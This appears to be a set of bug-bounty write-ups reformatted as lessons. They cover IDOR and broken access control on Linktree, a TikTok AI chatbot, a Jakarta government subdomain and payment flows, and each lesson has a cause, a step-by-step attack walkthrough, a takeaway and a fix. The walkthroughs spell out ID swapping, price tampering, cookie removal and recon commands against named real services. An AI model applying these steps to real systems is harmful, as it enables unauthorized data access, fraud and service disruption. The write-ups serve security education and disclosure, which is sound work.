lesson.fix: Add a strict authorization check that runs for every HTTP method, not just POST. The server should verify the caller’s session or token before querying any records, and it must bind the query to the authenticated user’s ID. If the endpoint is intended to be write‑only, configure the router to reject GET requests with a 405 Method Not Allowed response. Additionally, enforce least‑privilege by limiting returned fields to only what the requester is allowed to see. After the fix, a GET request without proper credentials should return an error instead of the full data set.

title: Broken Object Level Authorization (BOLA / IDOR) in Linktree GraphQL API Allows Unauthorized…
summary_en: A Broken Object Level Authorization (BOLA/IDOR) in Linktree’s GraphQL API lets an authenticated user modify a Link belonging to another workspace by swapping the Link ID in a mutation request.

lesson.cause: The server trusts the client‑provided Link identifier without checking that the authenticated user’s workspace owns that Link. The GraphQL resolver for the setDigitalDownloadLinkContext mutation accepts the supplied id and performs the update without verifying the user‑to‑object relationship. Because only authentication is enforced, any valid numeric Link ID can be used to target objects outside the caller’s scope.
lesson.walkthrough:
RECON
Step 1 – Capture a legitimate request
We logged in with a user that can manage its own Links and used the browser’s developer tools to copy the GraphQL request that updates a Link.
Verbatim request line: POST https://graph.linktr.ee/graphql
Why: The POST method sends data to the server; the URL is the GraphQL endpoint.

Step 2 – Identify the object identifier
In the captured request body we saw a field named "id" that held our own Link’s numeric identifier (e.g. <my-authorized-link-id>).
Why: An identifier tells the server which object to modify.

Step 3 – Modify the identifier to another workspace’s ID
We replaced the original id with a known ID from a different workspace (582743627).
Verbatim snippet:
Original Link ID: <my-authorized-link-id>
Modified Link ID: 582743627
Why: Changing the id directs the mutation to a different Link object.

Step 4 – Resend the altered request using the same authenticated session
We sent the edited request back to https://graph.linktr.ee/graphql with the same session cookie.
Why: The server still sees a valid authenticated user, so it processes the mutation.

Step 5 – Observe successful modification
The response indicated the mutation succeeded and the target Link’s fields (title, url, active, status) were updated.
Why: Because the resolver never checked that the user owned the Link, the operation was authorized only by authentication.

EXPLOITATION
Step 6 – Use the setDigitalDownloadLinkContext mutation
The mutation name that performed the change is setDigitalDownloadLinkContext and it accepts fields id, title, url, active, status.
Why: Mutations in GraphQL are the way to change data on the server.

Step 7 – Verify impact
We fetched the modified Link via the public Link URL and saw the new destination URL, confirming a phishing redirect.
Why: Changing the url field controls where visitors are sent.
lesson.takeaway: When testing GraphQL APIs, always look for object identifiers (numeric IDs, UUIDs) in mutation requests. Capture a legitimate request, replace the id with one you have discovered elsewhere, and resend it while keeping the same authentication cookies. Tools such as Burp Suite or OWASP ZAP can automate the replay. Variants of this bug appear in REST endpoints that accept resource IDs in the URL path or JSON body. A common beginner mistake is to assume that being logged in automatically grants permission to edit any object with a valid ID; always verify server‑side ownership checks.

title: Exposure of Shareable AWS S3 Pre-Signed Download URLs for Paid Digital Products
summary_en: A GraphQL API endpoint leaked AWS S3 pre-signed URLs for paid digital products, allowing anyone to download restricted content without payment or authentication for up to 24 hours.

lesson.cause: The application's GraphQL API was designed to return a pre-signed S3 download URL in the 'listing.url' field by default when retrieving product information. The root cause was a failure to verify if the requesting user had actually purchased the product before generating this temporary access link. Because the URL functioned as a 'bearer token' (possession equals access), the application relied on the secrecy of the URL rather than proper authorization logic. Additionally, the URL expiration was set to a very long duration (86400 seconds), increasing the window for unauthorized access.
lesson.walkthrough:
RECONNAISSANCE
1. The researcher accessed the Linktree platform and navigated to the digital products section where creators sell files.
2. They used a proxy tool to intercept the HTTP requests (messages sent by your computer to a server asking for data) between the browser and the server.

DISCOVERY
3. The researcher identified a GraphQL request (a specific way for apps to ask for exactly the data they need) used to fetch product details.
4. They inspected the response from the server and found a field named 'listing.url'.
listing.url
Why: This field contained a long web address pointing directly to Amazon's storage service (AWS S3).
5. The researcher analyzed the URL and found several AWS signing parameters (special codes that grant temporary permission to a file).
?X-Amz-Algorithm=...&X-Amz-Credential=...&X-Amz-Date=...&X-Amz-Expires=86400&X-Amz-Signature=...
Why: These parameters prove to Amazon that the person who generated the link has permission to share the file. The 'X-Amz-Expires=86400' part means the link stays active for 86,400 seconds (24 hours).

EXPLOITATION
6. The researcher copied the entire URL from the GraphQL response.
7. They opened a new 'Incognito' or private browser window where they were NOT logged into Linktree.
8. They pasted the URL directly into the address bar and pressed Enter.
https://[bucket-name].s3.amazonaws.com/[file-path]?X-Amz-Algorithm=...[rest of signature]
Why: This tests if the link is a 'bearer credential' (a key that works for anyone who holds it, regardless of their identity).

IMPACT
9. The browser immediately began downloading the digital product (e.g., a PDF or image) that was supposed to be behind a paywall.
10. The researcher confirmed that no Linktree session or cookie (a small file used to remember your login status) was required to access the file.
11. This proved that any user—even one who hadn't paid—could obtain and share these links to bypass the store's payment system.
lesson.takeaway: When hunting for bugs, always inspect API responses (especially GraphQL and JSON) for long URLs containing 'Amz-Signature' or 'Signature'. These are often pre-signed URLs. Always test if these URLs can be opened in a private browser window without being logged in. If the URL points to content that should be paid or private, you have found a vulnerability. A common mistake is assuming that because a URL is long and 'random-looking,' it is secure; in reality, if the API gives it to an unauthorized user, the security is broken. Look for 'Expires' values—longer durations (like 24 hours) significantly increase the severity of the leak.
lesson.fix:
The application must separate 'viewing product info' from 'downloading the product.' The GraphQL query for product details should not include the download URL. Instead, the URL should only be generated through a specific 'Download' endpoint that first checks the database to ensure the current user has a valid purchase record for that specific item. Additionally, the 'X-Amz-Expires' value should be set to a very short time (e.g., 60 to 300 seconds) to minimize the risk of link sharing.

Fixed Logic:
1. User requests product info -> Server returns name and price (NO URL).
2. User clicks 'Download' -> Server checks: 'Has this user paid?'
3. If yes -> Server generates a 5-minute pre-signed URL and sends it.
4. If no -> Server returns '403 Forbidden'.

title: When Deleting the Default Workspace Made the Entire Account Unusable
summary_en: An attacker could delete a 'protected' default workspace by manually changing the workspace ID in a deletion request, causing the entire account to become unusable.

lesson.cause: The application relied on frontend restrictions—simply hiding a button—to protect the default workspace instead of enforcing the rule on the server. The backend endpoint '/customer-service/workspace/v1/delete-workspace/{workspace_id}' accepted any valid workspace ID without verifying if that specific ID was marked as 'non-deletable' or 'system-required.' This allowed a user to bypass the user interface (UI) and trigger a deletion that the system's logic was not designed to handle, leading to a crash.
lesson.walkthrough:
RECON
1. The researcher logged into the application and identified a 'Default Workspace' that is automatically created for every user.
2. They observed that while other workspaces had a 'Delete' button in the UI (User Interface: the visual part of the app you click on), the Default Workspace did not.
DISCOVERY
3. To understand how the application handles deletions, the researcher created a temporary workspace named 'test'.
4. They opened a proxy tool (software that lets you see and change messages between your browser and the server) to capture the HTTP request (a message sent from your browser to a server to perform an action).
5. They clicked 'Delete' on the 'test' workspace and captured the following request:
GET /customer-service/workspace/v1/delete-workspace/12345
(Why: This reveals the endpoint (a specific web address for a task) and the workspace ID (a unique number identifying a specific folder)).
EXPLOITATION
6. The researcher needed the ID for the 'Default Workspace'. They found it by inspecting the page's HTML (the underlying code used to structure a webpage).
7. They assumed the Default Workspace ID was '999'.
8. Using the proxy tool, they manually crafted a new request, replacing the 'test' ID with the 'Default' ID.
GET /customer-service/workspace/v1/delete-workspace/999
(Why: This tests if the backend (the server's brain) checks if the ID is allowed to be deleted, or if it just follows any command it receives).
9. The researcher sent the modified request to the server.
10. The server responded with a '200 OK' status (a standard response code meaning the server successfully processed the request).
IMPACT
11. The researcher refreshed the application to see the results.
12. The 'Default Workspace' was gone, but the application now displayed a completely blank page.
13. They attempted to log out and log back in, but the application became stuck on a 'loading' screen.
14. This confirmed a Denial of Service (a state where a user is prevented from using the application) because the system's business logic (the rules of how the app works) required the Default Workspace to exist to function.
lesson.example: Imagine a fictional cloud storage site 'target.example'. When you sign up, you get a 'Primary Folder' that cannot be deleted in the settings menu. However, the site uses a link like 'https://target.example/api/remove?folder_id=101' to delete folders. If a user manually types 'https://target.example/api/remove?folder_id=PRIMARY_ID' into their browser, the server deletes it because it doesn't check if the ID belongs to the protected Primary Folder. Since the website's code is programmed to always open the Primary Folder upon login, the site now crashes for that user because it cannot find the folder it needs to start.
lesson.takeaway: Always test actions that are 'hidden' or 'disabled' in the UI by capturing a valid request for a similar allowed action and swapping the ID. This is a form of IDOR (Insecure Direct Object Reference), where you manipulate an ID to perform unauthorized actions. Look for 'Default', 'System', or 'Admin' objects that the application might depend on to function, as deleting them often causes high-impact business logic failures. A common mistake is assuming that if a button is missing, the server is automatically safe.

title: How a Simple Business Logic Flaw Allowed Arbitrary Price Manipulation
summary_en: A business logic flaw allowed users to manipulate the price of services during checkout by tampering with the 'amount' parameter in the HTTP request, enabling the purchase of expensive hosting for negligible sums.

lesson.cause: The application's backend trusted the client-side browser to provide the correct price for a transaction. Specifically, the /gateway/process endpoint accepted an 'amount' parameter directly from the user's POST request (a message sent to the server to submit data). Instead of the server looking up the verified price in its own database using the 'invoiceid', it blindly accepted whatever number the user provided and passed it to the payment gateway.
lesson.walkthrough:
RECON
1. The researcher selected a hosting service and generated an invoice on the platform.
2. They navigated to the checkout view at the endpoint (a specific web address) /viewinvoice.php.
DISCOVERY
3. The researcher opened Burp Suite (a tool used to intercept and modify web traffic) to monitor the communication between their browser and the server.
4. They clicked the payment button and intercepted the outgoing POST request (a type of HTTP request used to send data to a server).
5. They inspected the request body to identify how the price was being sent.
POST /gateway/process HTTP/2
Host: redacted.example.com
invoiceid=REDACTED&amount=4606800000&email=user%40example.com&pay=Submit
Why: This revealed that the 'amount' (the price) was being sent as a parameter (a piece of data) that could be easily edited by the user.
EXPLOITATION
6. The researcher sent the intercepted request to the Burp Suite Repeater tool to modify it.
7. They changed the 'amount' value from 4606800000 to a much smaller number.
amount=50000
Why: This tests if the backend (the server-side code) validates the price against the database or trusts the user's input.
8. They forwarded the modified request to the server.
9. The server responded with a 302 Found (a redirect instruction telling the browser to go to a new page).
HTTP/2 302 Found
Location: https://paymentgateway.example.com/payment/token_id
Why: The server accepted the fake price and generated a valid session with the third-party payment provider.
IMPACT
10. The researcher followed the redirect in their browser to the payment gateway.
11. They observed that the payment gateway was now asking for only 50,000 IRR instead of the original price.
Why: This confirms that an attacker could pay a fraction of the cost to receive full services.
lesson.example: Imagine a fictional site target.example that sells digital gift cards. When you click 'Buy', your browser sends this request: POST /buy-card HTTP/1.1 Host: target.example card_type=gold&price=100.00. A beginner attacker uses a proxy tool to catch this message before it leaves their computer. They change 'price=100.00' to 'price=0.01' and click send. Because the server at target.example just takes that 'price' value and sends it to PayPal, the attacker gets a $100 gift card for one cent. The server should have only asked for the 'card_type' and looked up the price itself in its secure database.
lesson.takeaway: Always look for financial values (price, discount, quantity) being passed in HTTP requests during checkout or cart updates. Use a proxy tool like Burp Suite to see if changing these values results in a lower total at the final payment step. A common signal is seeing both an ID (like invoice_id) and a value (like price) in the same request; the server should only need the ID. A variant of this is 'negative quantities,' where adding -1 of an item might reduce the total price of other items in the cart. Avoid the mistake of assuming that because a field is 'hidden' in the HTML, it cannot be changed by the user.
lesson.fix:
The server must never trust the price sent from the client. The payment initiation endpoint should only accept an invoice identifier. The backend should then fetch the correct amount from the database and send that verified amount to the payment gateway. Additionally, when the payment is finished, the server must verify the 'callback' (the confirmation message from the payment provider) to ensure the amount actually paid matches the amount owed.

title: Broken Access Control: Unauthenticated Read/Write Access to Every Conversation in an Tiktok AI…
summary_en: Multiple endpoints in the TikTok AI chatbot failed to enforce authentication, allowing anyone to list recent conversation IDs and read or send messages to any user's chat history without a login.

lesson.cause: The root cause was a complete failure to implement authentication checks on several backend API endpoints. While the application appeared to check for data ownership when a user provided a session cookie (a small file used to remember your login), it completely skipped all security checks if the cookie was missing entirely. This 'fail-open' logic meant that the server assumed any request without a login was safe to process, likely because developers assumed the conversation IDs (unique identification strings) were secret enough to prevent guessing. Additionally, the existence of a global '/conversations' endpoint that listed the 20 most recent chat IDs without any user-specific filtering allowed for easy discovery of other people's private data.
lesson.walkthrough:
RECON
1. Open the chatbot interface and use a proxy tool to capture the HTTP requests (messages sent from your browser to the server).
2. Identify the endpoint used to create a new chat session.
POST /.../agent/coze/conversation/create HTTP/1.1
Why: This request initializes a new chat and generates a unique ID for the conversation (a unique identification string).
3. Identify the endpoint used to send a message to the AI.
POST /.../agent/coze/chat HTTP/1.1
Why: This sends the user's text to the chatbot backend.
4. Identify the endpoint used to retrieve the chat history.
POST /.../agent/coze/conversation/message/list HTTP/1.1
Why: This loads previous messages so the user can see their conversation history.
DISCOVERY
5. Attempt an IDOR (Insecure Direct Object Reference - a bug where you access data by changing an ID) by keeping your login cookie but changing the 'conversation_id' to one you don't own.
{ "conversation_id": "<foreign_id>" }
Why: To see if the server checks if the logged-in user actually owns that specific chat.
6. Observe that the server returns an empty list, which initially suggests that security checks are in place.
EXPLOITATION
7. Perform a 'no-auth' test by removing the Cookie header (the part of the request that proves you are logged in) and resending the history request.
POST /.../agent/coze/conversation/message/list HTTP/1.1 (No Cookie Header)
Why: To check if the server requires a login at all (Authentication: the process of verifying who a user is).
8. Observe that the server returns the full chat history, proving that authentication is not enforced.
9. Search for more sensitive endpoints by guessing variations of the URL, such as changing '/conversation/create' to '/conversations'.
POST /.../agent/coze/conversations HTTP/1.1
Why: Pluralized endpoints often list multiple items; the researcher hoped to find a list of all chats.
10. Observe the response containing a list of the 20 most recent conversation IDs from other users globally.
11. Copy a 'conversation_id' belonging to a different user from that list.
IMPACT
12. Send a message to that foreign ID without being logged in.
POST /.../agent/coze/chat HTTP/1.1 with { "conversation_id": "<stolen_id>", "content": "hi" }
Why: To prove that an attacker can write data (Integrity: the assurance that data is not altered by unauthorized people) to any chat.
13. Request the message history for that same foreign ID.
POST /.../agent/coze/conversation/message/list HTTP/1.1 with { "conversation_id": "<stolen_id>" }
Why: To prove that an attacker can read data (Confidentiality: keeping data secret from unauthorized people) from any chat.
14. Confirm the response contains the injected message and the AI's reply, verifying full unauthorized access.
lesson.example: Imagine a fictional site 'support-bot.target.example' that lets users chat with a help agent. When you chat, your browser sends a request to 'https://support-bot.target.example/api/get_history?chat_id=99'. Normally, your browser also sends a header like 'Authorization: Bearer xyz123' to prove it is you. An attacker notices this and tries to change the ID to 'chat_id=100' while keeping their token, but the server says 'Access Denied'. However, when the attacker uses a tool to send the request 'GET /api/get_history?chat_id=100' with NO Authorization header at all, the server mistakenly thinks it is a public request and returns the full private chat history of user 100. This happens because the code only checks 'Does this token own this ID?' but forgets to check 'Is there even a token present?' before showing the data.
lesson.takeaway: The most important lesson is to always test endpoints by completely removing authentication headers, not just by swapping user accounts. Developers sometimes implement complex logic to check if 'User A' owns 'Object B', but forget to apply a global 'Is the user logged in?' check (Middleware: code that runs before the main logic to verify security). Look for pluralized endpoints (like /users instead of /user) or administrative-sounding paths, as these are often overlooked during security reviews. A common mistake is assuming that 'unguessable' IDs like long strings of random characters are a substitute for real authentication; they are not.
lesson.fix: The developers must implement a mandatory authentication middleware that runs for every request to the '/agent/' and '/conversation/' paths. This middleware should verify that a valid session exists before any other logic is executed; if no session is found, the request must be rejected with a '401 Unauthorized' error. Furthermore, the database query for retrieving messages should always include a filter for the 'user_id' derived from the authenticated session, like 'SELECT * FROM messages WHERE conversation_id = ? AND owner_id = ?'. This ensures that even if a user is logged in, they can only see conversations that belong to their specific account ID. Finally, the global '/conversations' list endpoint should be restricted to administrative users or removed entirely if not needed for the application's functionality.

title: From Payment Metadata to Unauthorized Subscription Access
summary_en: An unauthenticated API endpoint returns subscription records based on payment metadata, and the returned subscription IDs can be reused in another endpoint to fetch full subscription details, resulting in an access‑control breach.

lesson.cause: The API treats payment‑metadata fields (first six digits, last four digits, expiration date, amount) as an authorization boundary, but these values do not prove ownership of a subscription. The first endpoint returns subscription objects that include a raw identifier ("Id": "sc_...") without checking who is making the request. The second endpoint accepts that identifier as input and returns the full subscription record, again without any ownership or session verification. Because the server never validates that the caller owns the subscription, the identifier becomes an insecure direct object reference (IDOR). The root cause is a missing server‑side ownership/authorization check before exposing subscription data.
lesson.walkthrough:
RECON
Step 1: The researcher sent an unauthenticated request to the lookup endpoint with payment metadata.
{ "firstSix": "424242", "lastFour": "4242", "expDateMonth": 12, "expDateYear": 2030, "amount": 100 }
Why: HTTP request = data sent to a server; JSON payload = structured data; the fields look like card details but no Authorization header, cookie, or token is present, so the server cannot know who is calling.

Step 2: The server responded with a JSON array of subscription objects, each containing an "Id" like "sc_xxxxxxxxxxxxxxxxxxxxxxxxxxxxx".
Why: The response shows that the endpoint returns multiple records; the identifier is a reference to a subscription resource.

DISCOVERY
Step 3: The researcher noted the "Id" field and hypothesised it could be used elsewhere.
Why: In many APIs, a resource ID can be supplied to other endpoints to retrieve more data; this is a typical IDOR pattern.

Step 4: By browsing the API documentation (or fuzzing), the researcher found another endpoint that accepts a subscription ID.
Why: Finding a second endpoint that consumes the same identifier is the key to crossing an authorization boundary.

EXPLOITATION
Step 5: The researcher sent an unauthenticated POST request to /subscription/get with the discovered ID.
POST /subscription/get HTTP/1.1\nHost: target.example\nContent-Type: application/json\n\n{ "id": "sc_xxxxxxxxxxxxxxxxxxxxxxxxxxxxx" }
Why: The request body (payload) supplies the raw ID; no Authorization header or session cookie is included, so the server processes it as any other caller.

Step 6: The server returned the full subscription details (amount, currency, status, next transaction date, etc.).
Why: Because the server trusts the ID without verifying ownership, it leaks sensitive subscription information to anyone who knows the ID.

IMPACT
Step 7: The attacker now has unauthorized access to subscription metadata for many users, including future billing dates and merchant context.
Why: This data exposure can be used for profiling, phishing, or further attacks against the affected merchants and customers.
lesson.example:
Assume a fictional service at https://target.example. The API has two endpoints:
1. POST /api/subscriptions/search accepts {"cardBin":"123456","cardLast4":"7890","expMonth":12,"expYear":2025,"amount":50} and returns [{"Id":"sub_abc123","Amount":50,"Status":"Active"}, {"Id":"sub_def456","Amount":75,"Status":"Active"}].
2. POST /api/subscriptions/get accepts {"id":"sub_abc123"} and returns the full record.
If an attacker calls the first endpoint without any auth, they receive the IDs. They then call the second endpoint with one of those IDs, also without auth, and receive the full subscription data. The vulnerability exists because the server never checks that the caller owns "sub_abc123" before returning its details.
lesson.takeaway: When hunting APIs, look for endpoints that return resource identifiers without requiring authentication. Follow those identifiers to other endpoints that accept them as input – this often reveals IDOR or missing access‑control checks. Tools like Burp Suite's Intruder or OWASP ZAP can automate the search for ID parameters. Variants include using order numbers, invoice IDs, or user IDs as keys. A common beginner mistake is to assume that because an endpoint requires "payment metadata" it is safe; always verify that ownership is enforced on every subsequent request.

title: Broken Access Control Leading to Exposure of 7,000+ PII Records on a Jakarta Government Subdomain.
summary_en: A misconfigured subdomain allowed direct download of PDF files containing over 7,000 personal records, exposing sensitive PII without any authentication.

lesson.cause: The server returned a 403 Forbidden for the root path, but static PDF files were served without any access‑control checks. The web server’s configuration treated the PDFs as public resources, bypassing the intended authorization mechanism. No authentication or permission validation was performed before reading the files from disk. This design flaw let anyone request the PDF URLs directly and retrieve the data.
lesson.walkthrough:
RECON
Step 1: Run subdomain enumeration tools to discover hidden hosts.
Command: subfinder -d jakarta.go.id
Why: subfinder sends DNS queries to find subdomains (a subdomain is a part of a larger domain, like "test.example.com").

Step 2: Verify which subdomains respond over HTTP.
Command: httpx -domains discovered.txt
Why: httpx makes HTTP requests (a request is a message sent to a web server) to see if a site is reachable.

Step 3: Identify the target subdomain that returns 403 on the root.
Observation: redacted.jakarta.go.id returns "403 Forbidden" (HTTP status 403 means access is denied).
Why: The server blocks the root path but may not protect other resources.

DISCOVERY
Step 4: Collect all known URLs for the subdomain.
Command: gau redacted.jakarta.go.id
Why: GAU (Get All URLs) queries public sources (search engines, archives) to list every URL the site has ever exposed.

Step 5: Scan the GAU output for PDF files.
Observation: Several entries end with ".pdf" indicating PDF documents.
Why: File extensions tell the browser what type of file to expect; ".pdf" is a Portable Document Format.

Step 6: Open one PDF URL directly in a browser.
Action: Paste the URL into the address bar and press Enter.
Why: The browser sends an HTTP GET request (GET asks the server to return the resource) to fetch the file.

Step 7: Observe that the PDF loads despite the root being blocked.
Result: The PDF is displayed, revealing personal data.
Why: The server did not enforce authentication for that path.

EXPANSION
Step 8: Use a search‑engine dork to find more PDFs on the same host.
Query: site:redacted.jakarta.go.id .pdf
Why: "site:" limits results to the domain, and ".pdf" filters for PDF files.

Step 9: Review the search results; multiple PDF links appear.
Why: Indicates a systematic exposure, not a single mistake.

IMPACT
Step 10: Download a PDF to confirm it contains PII (full names, NIK, birth place, etc.).
Why: Demonstrates the real‑world impact – personal data can be harvested.

Step 11: Document the findings and report them responsibly to the security team.
Why: Responsible disclosure ensures the issue is fixed without further harm.

Step 12: Receive acknowledgment and a certificate of appreciation.
Why: Shows the program’s bug‑bounty process works.
lesson.example:
**Fictional Target:** files.example.com
**Vulnerable Setup:** The web server serves files from "/var/www/files" and has the following Apache config:
```
<Directory "/var/www/files">
    Require all denied
</Directory>

Alias "/public/" "/var/www/files/"
```
The `Require all denied` line blocks the root, but the `Alias` makes every file under "/public/" publicly reachable without authentication.
**Attack Request:**
```
GET /public/records.pdf HTTP/1.1
Host: files.example.com
```
**Why it works:** The `Alias` directive maps the URL path "/public/" directly to the filesystem folder, bypassing the `Require all denied` rule. The server returns the PDF to anyone who knows the URL, exposing any data inside.
lesson.takeaway: When a site returns 403 on the homepage, still probe for static resources like PDFs, images, or documents; they may be unintentionally public. Use tools like GAU, waybackurls, or search‑engine dorks (e.g., `site:target.com filetype:pdf`) to enumerate hidden files. This pattern often appears in misconfigured cloud storage buckets, S3 static sites, or web servers that separate authentication logic from static asset serving. Beginners should avoid assuming a 403 response protects all content – always test individual paths.
lesson.fix: Configure the web server to enforce authentication before serving any file under the protected directory. For Apache, place the `Require all denied` rule inside the same `<Directory>` block that serves the files, or use `<Location>` with proper access controls. Move sensitive PDFs out of the web‑accessible directory or store them behind an application that checks user sessions before delivering the file. Additionally, enable directory‑level access logs to detect unauthorized downloads and regularly scan for publicly exposed files using automated tools.
